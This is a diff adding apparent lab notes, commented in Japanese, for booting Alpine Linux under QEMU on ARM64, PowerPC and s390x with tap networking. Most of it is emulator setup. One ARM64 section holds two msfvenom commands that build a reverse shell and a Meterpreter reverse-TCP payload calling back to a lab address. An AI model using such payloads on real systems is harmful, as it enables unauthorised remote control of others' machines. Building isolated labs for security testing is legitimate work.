@@ -39,4 +39,60 @@ sudo ip tuntap add dev tap3 mode tap
 sudo ip addr add 192.168.4.1/24 dev tap3
 sudo ip link set tap3 up
 
+-------------------------------------------------------------------------------------------------
+【ARM64 (AArch64)】
 
+mkdir -p ~/qemu-arm64 && cd ~/qemu-arm64
+
+# ダウンロード（-q を外して確実に進捗確認）
+wget -O vmlinuz-lts https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/aarch64/netboot/vmlinuz-lts
+wget -O initramfs-lts https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/aarch64/netboot/initramfs-lts
+
+# QEMU 起動 (新構文: netdev + device)
+qemu-system-aarch64 -M virt -cpu cortex-a57 -m 512m \
+  -kernel vmlinuz-lts -initrd initramfs-lts -nographic \
+  -append "console=ttyAMA0 ip=192.168.1.50::192.168.1.1:255.255.255.0" \
+  -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
+  -device virtio-net-pci,netdev=net0
+
+【venom】
+msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1111 -f elf -o rev_arm64.elf
+
+msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=2222 -f elf -o met_arm64.elf
+
+-------------------------------------------------------------------------------------------------
+RISC-V (riscv64)
+
+-------------------------------------------------------------------------------------------------
+【PowerPC (ppc64le)】
+
+mkdir -p ~/qemu-ppc64 && cd ~/qemu-ppc64
+
+# ダウンロード（latest-stable に修正）
+wget -O vmlinuz-lts https://dl-cdn.alpinelinux.org/alpine/latest-stable/releases/ppc64le/netboot/vmlinuz-lts
+wget -O initramfs-lts https://dl-cdn.alpinelinux.org/alpine/latest-stable/releases/ppc64le/netboot/initramfs-lts
+
+# QEMU 起動
+qemu-system-ppc64 -M pseries -m 512m \
+  -kernel vmlinuz-lts -initrd initramfs-lts -nographic \
+  -append "console=hvc0 ip=192.168.3.50::192.168.3.1:255.255.255.0" \
+  -netdev tap,id=net0,ifname=tap2,script=no,downscript=no \
+  -device virtio-net-pci,netdev=net0
+
+-------------------------------------------------------------------------------------------------
+【System/390 (s390x)】
+
+mkdir -p ~/qemu-s390x && cd ~/qemu-s390x
+
+# ダウンロード（latest-stable に修正）
+wget -O vmlinuz-lts https://dl-cdn.alpinelinux.org/alpine/latest-stable/releases/s390x/netboot/vmlinuz-lts
+wget -O initramfs-lts https://dl-cdn.alpinelinux.org/alpine/latest-stable/releases/s390x/netboot/initramfs-lts
+
+# QEMU 起動 (※s390x のみ virtio-net-ccw を使用)
+qemu-system-s390x -M s390-ccw-virtio -m 512m \
+  -kernel vmlinuz-lts -initrd initramfs-lts -nographic \
+  -append "console=ttysclp0 ip=192.168.4.50::192.168.4.1:255.255.255.0" \
+  -netdev tap,id=net0,ifname=tap3,script=no,downscript=no \
+  -device virtio-net-ccw,netdev=net0
+
+-------------------------------------------------------------------------------------------------
